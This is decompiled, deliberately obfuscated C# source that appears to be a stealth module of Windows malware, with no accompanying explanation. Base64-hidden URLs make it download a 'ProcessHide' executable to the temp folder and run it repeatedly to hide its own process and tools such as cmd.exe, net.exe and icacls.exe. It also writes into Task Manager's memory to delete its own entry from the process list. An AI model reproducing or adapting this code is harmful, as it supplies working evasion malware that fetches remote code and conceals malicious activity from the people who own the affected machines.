using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace vQzMGKHeycFziMq;

internal class xkRzQgTOxjz
{
	private struct AUFnmYkITJNRx
	{
		public uint yOEFIHpUaUdZc;

		public IntPtr QhhKCZIFfMVwrWljv;

		public IntPtr ddIExuDfTRDOG;

		public uint guBIifaehEt;

		public uint DZmPDrbxOBTyCA;

		public IntPtr saschIzeulHA;

		public uint bcypqArXtVOH;

		public int HlLXsNRluwg;

		public IntPtr nSFjYhPXoGnBiLLPD;
	}

	private const int loZYyYhthiU = 8;

	private const int pYNoqAHRGVbew = 16;

	private const int ikeUUrjnKfgLtIc = 32;

	private const int MBGXdMHOWpyCcNz = 0;

	private const int TlLVCNyHOrBwdgip = 4096;

	private const int mTUdhgDxThmzEM = 8192;

	private const int EFxLTYmVOrqcN = 16384;

	private const int eXKhtbpxdntTla = 32768;

	private const int GSXNgOCsilR = 65536;

	private const int mIOcBGIyDhCG = 131072;

	private const int zsKcPtpALsRm = 262144;

	private const int UggzwkZhPQ = 1048576;

	private const int EYrRwpvmcWH = 1;

	private const int lNCZNRuyYx = 2;

	private const int ivJgMdrbmgppi = 4;

	private const int hVxWUSRePP = 8;

	private const int IuujKDDzcdwEEW = 16;

	private const int QberFggNOIVnQ = 32;

	private const int RYkPMihdTjeHZn = 64;

	private const int yHLbKwbPikYn = 128;

	private const int FEEAtfqKQwoY = 256;

	private const int DiIEwmvmatp = 512;

	private const int QtvmxkXGODzZ = 4096;

	private const int WBQaOAuACbmGCA = 4100;

	private const int QwIVCDaVXT = 4104;

	private const int bcMpkMmnWsq = 4141;

	private const int SgLwuPXrNqHxrc = 4142;

	private const int lveqEoakyeJqcNT = 4124;

	private static volatile bool BKoTCBvgZCLC = false;

	public static volatile bool deDuVIuRDxJi = true;

	public static string ciJHdtCiYwCucyKd()
	{
		if (IntPtr.Size == 8)
		{
			yzZnBHwSsJOOcf.xvavKZhscsP = OULFgZrsSvCCgX(new Uri(yzZnBHwSsJOOcf.jLGThbkXlozfB("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlNjQuZXhl")));
		}
		else
		{
			yzZnBHwSsJOOcf.xvavKZhscsP = OULFgZrsSvCCgX(new Uri(yzZnBHwSsJOOcf.jLGThbkXlozfB("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlMzIuZXhl")));
		}
		return yzZnBHwSsJOOcf.xvavKZhscsP;
	}

	public static string OULFgZrsSvCCgX(Uri nzwwVZQblpI)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(nzwwVZQblpI, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process JkwiOJcuQDNrTukz(string AwGfTGJDkPkf)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(AwGfTGJDkPkf))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void ZiKybVjpMkSxOel(string[] hGbRfiloBvRq)
	{
		string text = ciJHdtCiYwCucyKd();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string awGfTGJDkPkf in hGbRfiloBvRq)
			{
				Process process = JkwiOJcuQDNrTukz(awGfTGJDkPkf);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + " *32");
					yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(text, text2 + " " + yzZnBHwSsJOOcf.jLGThbkXlozfB("Y29uaG9zdC5leGU="));
					yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(text, text2 + " " + yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="));
					yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(text, text2 + " " + yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0MS5leGU="));
					yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(text, text2 + " " + yzZnBHwSsJOOcf.jLGThbkXlozfB("QVJQLkVYRQ=="));
					yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(text, text2 + " " + yzZnBHwSsJOOcf.jLGThbkXlozfB("aWNhY2xzLmV4ZQ=="));
					yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(text, text2 + " " + yzZnBHwSsJOOcf.jLGThbkXlozfB("Y21kLmV4ZQ=="));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int QyVpDHkXfVob, bool eVxSpLsDdN, uint eDlbvWcFEN);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr csVMvJXthJcSs, IntPtr iMsunSqdgSSdq, uint nNyehWquTVs, int bQmNmWjknInvPJz, int kyCPycmuyVLd);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr BEAbveJGIqUhY, IntPtr XvUMYuXJckPhkh, uint XpRVDSnJqEdb, int ozALBZIOxXjrd);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr JfnOOGIvhyGeh);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr tOGvFYlpswVG, IntPtr PIQspUHEUxg, byte[] BjwLkWGObCwWiS, uint zyYZQaXsknSoX, out UIntPtr pfkUCnteaKgiS);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr iFHaQIXtAK, IntPtr BfupburJHJOK, [Out] byte[] SthHlXmpdwrO, int XwpoLknwPBqoTDA, out UIntPtr XUDWengCXatl);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr HxxxGcBSfGAUp, out uint WssvenfcyrD);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr WyJNvTrlXCk, uint jTkZLCRHvSz, IntPtr toQQIrhwdCj, IntPtr GtnUHxaJQfRRrP);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string JrFyfPEGVkddT, string aCtryLNZVMnD);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr zzjYyhIaYXkxEx, IntPtr iupYXdjxPWwIsX, string NWxQmxpjmy, string LZAzVGOtsxI);

	private static byte[] iLjDGIYwRFoaJ(object fSjXcxkcaGr)
	{
		int num = Marshal.SizeOf(fSjXcxkcaGr);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(fSjXcxkcaGr, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr JXMQaoGrnCJ(uint vDMwKZzwaWN)
	{
		return OpenProcess(56, eVxSpLsDdN: false, vDMwKZzwaWN);
	}

	private static void IujicPfVLkxiXJP(IntPtr yIIFBnfBIcwLFcXvy)
	{
		CloseHandle(yIIFBnfBIcwLFcXvy);
	}

	private static IntPtr soIbUvqIbInjJBM(uint zupBRdxCLHUD, IntPtr gnuxljaPQzpqw)
	{
		return VirtualAllocEx(gnuxljaPQzpqw, IntPtr.Zero, zupBRdxCLHUD, 12288, 4);
	}

	private static void pVKVORVLfQH(IntPtr uzUHottiZE, IntPtr VbjFWFJQiWCvUU, uint IdbGQmgRoTMN)
	{
		VirtualFreeEx(uzUHottiZE, VbjFWFJQiWCvUU, IdbGQmgRoTMN, 32768);
	}

	private static IntPtr yaDditVUEM()
	{
		IntPtr intPtr = FindWindow("TaskManagerWindow", "Administrador de tareas");
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow("#32770", "Task Manager");
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
			return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Processes");
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
		return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Procesos");
	}

	private static IntPtr ULbeoxNOjGz(IntPtr ndNvMjDtwpBhqo)
	{
		return SendMessage(ndNvMjDtwpBhqo, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void svwSUTKdLdmr(IntPtr HmZSspMNeuf, IntPtr roVzSlYBrWU)
	{
		SendMessage(HmZSspMNeuf, 4104u, roVzSlYBrWU, IntPtr.Zero);
	}

	private static void ZgbBZnBNahImi(IntPtr eDPRHiuIWH)
	{
		SendMessage(eDPRHiuIWH, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string ykjuDSOZpcb(IntPtr epMBlOISvw, IntPtr cbGlzRBKXuPf)
	{
		byte[] array = new byte[50];
		AUFnmYkITJNRx aUFnmYkITJNRx = default(AUFnmYkITJNRx);
		GetWindowThreadProcessId(epMBlOISvw, out var WssvenfcyrD);
		IntPtr intPtr = JXMQaoGrnCJ(WssvenfcyrD);
		IntPtr intPtr2 = soIbUvqIbInjJBM((uint)Marshal.SizeOf(aUFnmYkITJNRx), intPtr);
		IntPtr intPtr3 = soIbUvqIbInjJBM(50u, intPtr);
		aUFnmYkITJNRx.QhhKCZIFfMVwrWljv = cbGlzRBKXuPf;
		aUFnmYkITJNRx.ddIExuDfTRDOG = (IntPtr)0;
		aUFnmYkITJNRx.bcypqArXtVOH = 50u;
		aUFnmYkITJNRx.saschIzeulHA = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, iLjDGIYwRFoaJ(aUFnmYkITJNRx), (uint)Marshal.SizeOf(aUFnmYkITJNRx), out var pfkUCnteaKgiS);
		SendMessage(epMBlOISvw, 4141u, cbGlzRBKXuPf, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out pfkUCnteaKgiS);
		pVKVORVLfQH(intPtr, intPtr2, (uint)Marshal.SizeOf(aUFnmYkITJNRx));
		pVKVORVLfQH(intPtr, intPtr3, 50u);
		IujicPfVLkxiXJP(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void sbMvzkJFZn(string AXEXrkVIBOHIc)
	{
		IntPtr intPtr = yaDditVUEM();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)ULbeoxNOjGz(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = ykjuDSOZpcb(intPtr, (IntPtr)i);
			if (text.Contains(AXEXrkVIBOHIc))
			{
				svwSUTKdLdmr(intPtr, (IntPtr)i);
			}
		}
	}

	private static void zJGCYpULRgO()
	{
		IntPtr intPtr = yaDditVUEM();
		if (intPtr != IntPtr.Zero)
		{
			ZgbBZnBNahImi(intPtr);
			ZgbBZnBNahImi(intPtr);
			ZgbBZnBNahImi(intPtr);
			ZgbBZnBNahImi(intPtr);
			ZgbBZnBNahImi(intPtr);
		}
	}

	public static void CJdnHcrOWe()
	{
		Thread thread = new Thread(HXDYzOlZXggkYkC);
		thread.Start();
	}

	public static void GwVtidmHBzpN()
	{
		BKoTCBvgZCLC = true;
	}

	private static void HXDYzOlZXggkYkC()
	{
		while (!BKoTCBvgZCLC)
		{
			if (deDuVIuRDxJi)
			{
				sbMvzkJFZn(Process.GetCurrentProcess().ProcessName + ".exe");
				Thread.Sleep(525);
			}
			else
			{
				zJGCYpULRgO();
				Thread.Sleep(1000);
			}
		}
		BKoTCBvgZCLC = false;
	}
}
